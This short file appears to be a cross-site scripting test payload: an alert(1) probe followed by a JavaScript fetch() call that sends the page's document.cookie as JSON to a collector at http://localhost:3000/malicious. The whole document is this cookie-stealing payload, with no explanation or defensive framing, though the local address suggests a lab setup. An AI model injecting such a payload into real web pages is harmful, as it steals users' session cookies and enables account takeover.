
alert(1)

fetch('http://localhost:3000/malicious', {method: 'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({'cookie': document.cookie})}).then(response=>response.json()).then(data=>{console.log(data)})